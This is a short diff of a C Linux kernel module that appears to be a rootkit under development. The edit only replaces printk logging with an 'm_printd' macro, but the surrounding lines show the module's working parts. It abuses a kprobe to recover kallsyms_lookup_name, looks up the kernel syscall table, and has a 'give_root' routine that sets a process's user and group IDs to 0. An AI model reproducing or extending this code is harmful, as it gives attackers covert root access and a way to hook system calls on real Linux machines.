@@ -2,7 +2,6 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/module.h>
-#include <linux/printk.h>
 #include <linux/kprobes.h>
 #include <linux/string.h>
 
@@ -56,13 +55,13 @@ void get_kallsyms_funcptr(void)
 
     if (register_kprobe(&probe))
     {
-        printk(KERN_ERR "Huge fuck up, couldn't find kallsyms blah blah");
+        m_printd(KERN_ERR "Huge fuck up, couldn't find kallsyms blah blah");
     }
 
     lookup_name = (kallsyms_t)(probe.addr);
     unregister_kprobe(&probe);
 
-    printk(KERN_INFO "kallsyms_lookup_name @ %p\n", lookup_name);
+    m_printd(KERN_INFO "kallsyms_lookup_name @ %p\n", lookup_name);
 }
 
 void get_syscall_table(void)
@@ -70,10 +69,10 @@ void get_syscall_table(void)
     syscall_table = (long unsigned int *)lookup_name("sys_call_table");
     if (!syscall_table)
     {
-        printk(KERN_ERR "Couldn't find syscall table");
+        m_printd(KERN_ERR "Couldn't find syscall table");
         return;
     }
-    printk(KERN_INFO "Found syscall table @ %p", syscall_table);
+    m_printd(KERN_INFO "Found syscall table @ %p", syscall_table);
 }
 
 void give_root(void)
@@ -81,7 +80,7 @@ void give_root(void)
     struct cred *newcreds;
     newcreds = prepare_creds();
 
-    printk(KERN_INFO "Giving root to %d", newcreds->uid.val);
+    m_printd(KERN_INFO "Giving root to %d", newcreds->uid.val);
 
 	newcreds->uid.val = newcreds->gid.val = 0;
 	newcreds->euid.val = newcreds->egid.val = 0;
